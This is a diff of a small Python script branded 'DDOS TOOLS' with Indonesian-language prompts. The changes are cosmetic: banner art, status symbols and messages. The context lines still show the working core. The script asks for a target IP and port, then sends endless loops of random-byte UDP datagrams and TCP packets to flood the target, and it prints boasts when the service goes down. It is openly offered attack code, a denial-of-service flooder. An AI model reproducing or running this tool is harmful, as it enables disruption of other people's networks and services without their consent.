@@ -15,8 +15,8 @@ else :
     
 os.system("clear")
 print("DDOS TOOLS")
-print("██╗░░░██╗░█████╗░██╗░░░░░░░░██║░░░██║██╔══██╗██║░░░░░░░░╚██╗░██╔╝███████║██║░░░░░░░░░╚████╔╝░██╔══██║██║░░░░░░░░░░╚██╔╝░░██║░░██║███████╗██╗░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝")
-print("HD COMMUNITY ")
+print("VAL.")
+print("HD COMMUNITY")
 ip = str(input(" Ip:"))
 port = int(input("  Port:"))
 choice = str(input(" Gas Serang? (y/n):"))
@@ -31,13 +31,13 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Val Nih Dilawan")
+			print(i +" Val Nih Dek Dilawan")
 		except:
 			print("[!]  Down Ini Mah No Debat")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("[x]","[+]","[*]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,7 +45,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Val Nih Dilawan")
+			print(i +" Val Nih Dek Dilawan")
 		except:
 			s.close()
 			print("[*] Down!!!")
